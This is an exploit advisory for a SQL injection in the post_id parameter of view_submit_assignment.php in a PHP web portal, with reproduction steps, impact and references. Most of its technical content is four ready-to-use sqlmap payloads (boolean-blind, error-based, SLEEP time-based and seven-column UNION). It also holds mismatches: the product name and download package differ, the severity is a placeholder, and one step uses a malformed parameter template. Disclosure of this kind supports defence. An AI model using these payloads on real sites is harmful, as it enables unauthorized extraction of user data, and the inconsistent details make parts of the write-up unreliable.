# Exploit Title: Engineers Online Portal – SQL Injection in view_submit_assignment.php (`http://localhost/niamunozmonitoringsystem/view_submit_assignment.php?post_id=1`)

**Date:** 2025-08-11  
**Exploit Author:** Anonymous  
**Vendor Homepage:** https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html  
**Software Link:** https://www.sourcecodester.com/sites/default/files/download/oretnom23/nia_munoz_monitoring_system.zip  
**Version:** 1.0.7.18  
**Tested on:** PHP 7.4 on Ubuntu 20.04  

---

## Summary

A SQL Injection vulnerability exists in the `view_submit_assignment.php` endpoint of **Engineers Online Portal**. Unsanitized user input in the specified parameter is interpolated directly into an SQL query, allowing attackers to infer or extract data and, in some cases, execute stacked/time-based payloads.  
**Back-end DBMS (as detected):** MySQL >= 5.0 (MariaDB fork)  
**CWE:** CWE-89 (SQL Injection)  
**Severity:** High (placeholder — adjust once CVSS is computed)

## Affected Component & Parameter

### Affected Endpoint

- **URL:** `http://localhost/niamunozmonitoringsystem/view_submit_assignment.php?post_id=1`
- **HTTP Method:** GET
- **Vulnerable File:** `view_submit_assignment.php`
- **Parameter:** `post_id`
- **Vector Location:** GET

### Injection Techniques (as identified by sqlmap)
- **Type:** boolean-based blind
  - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
  - **Payload:** `post_id=1' AND 8952=(SELECT (CASE WHEN (8952=8952) THEN 8952 ELSE (SELECT 3790 UNION SELECT 7001) END))-- -`
- **Type:** error-based
  - **Title:** MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
  - **Payload:** 
```
post_id=1' AND (SELECT 4438 FROM(SELECT COUNT(*),CONCAT(0x71706a6b71,(SELECT (ELT(4438=4438,1))),0x716a787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TtCW
```
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `post_id=1' AND (SELECT 3245 FROM (SELECT(SLEEP(5)))ssMB)-- dVoY`
- **Type:** UNION query
  - **Title:** Generic UNION query (NULL) - 7 columns
  - **Payload:** 
```
post_id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a6b71,0x4673674b437477535368664c706e46425a42775a6370584c61486349585869434c464b5a7455584f,0x716a787671)-- -
```



## Proof of Concept (Burp Repeater)

![burp-repeater-poc](poc.png)

## SQLMap Summary

![sqlmap-summary](sqlmap_summary.png)



## Technical Description

The vulnerable parameter is reflected into the SQL statement without proper validation or prepared statements. Boolean-based blind, time-based blind (SLEEP), and/or UNION-based vectors were verified by sqlmap. This enables database enumeration and potential data exfiltration under the privileges of the application’s DB user.

## Impact

- Enumeration of database schemas, tables, and rows  
- Exposure of sensitive user/operational data  
- Potential lateral movement if credentials or session material are stored in DB

## Steps to Reproduce

1. Browse to `http://localhost/niamunozmonitoringsystem/view_submit_assignment.php?post_id=1`.  
2. Intercept the request and inject the provided payload(s) into parameter `view_submit_assignment.php?&<param>=...`.  
3. Observe conditional responses / time delays / injected row reflections per technique above.  
4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.

## Vulnerable Code (Screenshot)

![vulnerable-code](code_snippet.png)


References
OWASP: SQL Injection Prevention Cheat Sheet

CWE-89: SQL Injection
